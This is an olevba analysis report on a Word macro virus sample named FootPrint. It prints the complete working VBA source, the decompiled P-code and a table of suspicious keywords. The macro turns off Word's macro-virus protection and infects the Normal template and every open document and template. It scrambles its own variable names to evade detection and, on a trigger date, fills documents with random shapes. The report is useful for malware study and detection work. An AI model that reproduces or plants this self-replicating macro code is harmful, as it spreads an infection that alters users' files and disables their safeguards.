olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FootPrint.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FootPrint.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For
= 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next AL3250: End If
PI9186 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CU9793 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set AH77 = ActiveDocument.VBProject.VBComponents.Item(1)
IA3217 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set AH77 = NormalTemplate.VBProject.VBComponents.Item(1)
CR4768 = True
Call OV1646_NJ830
ActiveDocument.Saved = True
End If
If CR4768 <> True And IA3217 <> True Then GoTo CM2464
If CR4768 = True Then AH77.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PI9186 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If IA3217 = True Then AH77.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CU9793 - 4))
CM2464:
If CU9793 <> 0 And PI9186 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function OV1646_NJ830()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "DR618": r1(2) = "MB872": r1(3) = "KG5522": r1(4) = "IF6887": r1(5) = "NJ830": r1(6) = "PI9186"
r1(7) = "CU9793": r1(8) = "IA3217":: r1(9) = "AH77": r1(10) = "CR4768": r1(11) = "CM2464": r1(12) = "OV1646": r1(13) = "QF861": r1(14) = "HS9530": r1(15) = "AL3250"
For AL3250 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call NJ830(a1, r1(AL3250))
Next AL3250
End Function 'VAMP v1.0 [thanks Vic!]
Private Function NJ830(HS9530, QF861 As String)
On Error Resume Next
Dim DR618 As Long: Dim MB872 As Long: Dim KG5522 As Long: Dim IF6887 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DR618 = 1: MB872 = 1: KG5522 = .CountOfLines: IF6887 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QF861, DR618, MB872, KG5522, IF6887, True)
strline = .Lines(DR618, 1)
strline = Left(strline, MB872 - 1) & HS9530 & Mid(strline, IF6887)
.replaceline DR618, strline
DR618 = KG5522 + 1: MB872 = 1:
KG5522 = .CountOfLines
IF6887 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Dim al As String
Dim adoc As Document
Dim atpl As Template
Dim CoL As Integer
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
For Each adoc In Documents
    adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
    If Not adoc.CustomDocumentProperties("FootPrint1") Then
        adoc.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties("FootPrint1") Then
        atpl.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
NormalTemplate.Save
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.FootPrint.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8592 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	Reparse 0x000E "Randomize: For"
' Line #6:
' 	Reparse 0x0016 "= 1 To (Int(Rnd * 70))"
' Line #7:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #9:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #10:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld AL3250 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PI9186 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CU9793 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AH77 
' Line #15:
' 	LitVarSpecial (True)
' 	St IA3217 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AH77 
' Line #19:
' 	LitVarSpecial (True)
' 	St CR4768 
' Line #20:
' 	ArgsCall (Call) OV1646_NJ830 0x0000 
' Line #21:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld CR4768 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld IA3217 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CM2464 
' 	EndIf 
' Line #24:
' 	Ld CR4768 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld PI9186 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0030 "Application.Quit SaveChanges:=wdDoNotSaveChanges"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld AH77 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #25:
' 	Ld IA3217 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld CU9793 
' 	LitDI2 0x0004 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld AH77 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #26:
' 	Label CM2464 
' Line #27:
' 	Ld CU9793 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld PI9186 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #30:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' 	QuoteRem 0x0008 0x003F "W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]"
' Line #32:
' 	FuncDefn (Private Function OV1646_NJ830(id_FFFE As Variant))
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	ArgsCall Read 0x0000 
' Line #35:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	VarDefn r1 (As String)
' Line #36:
' 	LitStr 0x0005 "DR618"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "MB872"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KG5522"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IF6887"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "NJ830"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "PI9186"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #37:
' 	LitStr 0x0006 "CU9793"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IA3217"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0004 "AH77"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CR4768"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CM2464"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "OV1646"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "QF861"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "HS9530"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AL3250"
' 	LitDI2 0x000F 
' 	ArgsSt r1 0x0001 
' Line #38:
' 	StartForVariable 
' 	Ld AL3250 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #39:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #40:
' 	Ld a1 
' 	Ld AL3250 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) NJ830 0x0002 
' Line #41:
' 	StartForVariable 
' 	Ld AL3250 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0017 "VAMP v1.0 [thanks Vic!]"
' Line #43:
' 	FuncDefn (Private Function NJ830(HS9530, QF861 As String, id_FFFE As Variant))
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	Dim 
' 	VarDefn DR618 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn MB872 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn KG5522 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn IF6887 (As Long)
' Line #46:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #47:
' 	LitDI2 0x0001 
' 	St DR618 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St MB872 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St KG5522 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St IF6887 
' Line #48:
' 	Ld QF861 
' 	Ld DR618 
' 	Ld MB872 
' 	Ld KG5522 
' 	Ld IF6887 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #49:
' 	Ld DR618 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #50:
' 	Ld strline 
' 	Ld MB872 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld HS9530 
' 	Concat 
' 	Ld strline 
' 	Ld IF6887 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #51:
' 	Ld DR618 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #52:
' 	Ld KG5522 
' 	LitDI2 0x0001 
' 	Add 
' 	St DR618 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St MB872 
' 	BoS 0x0000 
' Line #53:
' 	MemLdWith CountOfLines 
' 	St KG5522 
' Line #54:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St IF6887 
' Line #55:
' 	Loop 
' Line #56:
' 	EndWith 
' Line #57:
' 	EndFunc 
' Line #58:
' 	FuncDefn (Private Sub Document_New())
' Line #59:
' 	ArgsCall Document_Open 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Private Sub Document_Open())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	Dim 
' 	VarDefn al (As String)
' Line #64:
' 	Dim 
' 	VarDefn adoc (As Document)
' Line #65:
' 	Dim 
' 	VarDefn atpl (As Template)
' Line #66:
' 	Dim 
' 	VarDefn CoL (As Integer)
' Line #67:
' 	LitStr 0x0010 "c:\footprint.$$$"
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #68:
' 	LitStr 0x0010 "c:\footprint.$$$"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #69:
' 	LitStr 0x0010 "c:\footprint.$$1"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #70:
' 	LitDI2 0x0001 
' 	Ld al 
' 	LineInput 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld al 
' 	LineInput 
' Line #72:
' 	LitDI2 0x0001 
' 	Ld al 
' 	LineInput 
' Line #73:
' 	LitDI2 0x0001 
' 	Ld al 
' 	LineInput 
' Line #74:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #75:
' 	LitDI2 0x0001 
' 	Ld al 
' 	LineInput 
' Line #76:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld al 
' 	PrintItemNL 
' Line #77:
' 	Wend 
' Line #78:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #79:
' 	LitDI2 0x0002 
' 	Close 0x0001 
' Line #80:
' 	StartForVariable 
' 	Ld adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #81:
' 	Ld adoc 
' 	MemLd FullName 
' 	Ld wdHeaderFooterPrimary 
' 	LitDI2 0x0001 
' 	Ld adoc 
' 	ArgsMemLd Sections 0x0001 
' 	ArgsMemLd Footers 0x0001 
' 	MemLd Range 
' 	MemSt Then 
' Line #82:
' 	LitStr 0x000A "FootPrint1"
' 	Ld adoc 
' 	ArgsMemLd CustomDocumentProperties 0x0001 
' 	Not 
' 	IfBlock 
' Line #83:
' 	LitStr 0x000A "FootPrint1"
' 	ParamNamed New 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	LitVarSpecial (True)
' 	ParamNamed Value 
' 	Ld msoPropertyTypeBoolean 
' 	ParamNamed TypeOf 
' 	Ld adoc 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #84:
' 	LitStr 0x000C "ThisDocument"
' 	Ld adoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CoL 
' Line #85:
' 	LitDI2 0x0001 
' 	Ld CoL 
' 	LitStr 0x000C "ThisDocument"
' 	Ld adoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	LitStr 0x0010 "c:\footprint.$$1"
' 	LitStr 0x000C "ThisDocument"
' 	Ld adoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	StartForVariable 
' 	Next 
' Line #89:
' 	StartForVariable 
' 	Ld atpl 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #90:
' 	LitStr 0x000A "FootPrint1"
' 	Ld atpl 
' 	ArgsMemLd CustomDocumentProperties 0x0001 
' 	Not 
' 	IfBlock 
' Line #91:
' 	LitStr 0x000A "FootPrint1"
' 	ParamNamed New 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	LitVarSpecial (True)
' 	ParamNamed Value 
' 	Ld msoPropertyTypeBoolean 
' 	ParamNamed TypeOf 
' 	Ld atpl 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #92:
' 	LitStr 0x000C "ThisDocument"
' 	Ld atpl 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CoL 
' Line #93:
' 	LitDI2 0x0001 
' 	Ld CoL 
' 	LitStr 0x000C "ThisDocument"
' 	Ld atpl 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #94:
' 	LitStr 0x0010 "c:\footprint.$$1"
' 	LitStr 0x000C "ThisDocument"
' 	Ld atpl 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	StartForVariable 
' 	Next 
' Line #97:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' Line #100:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

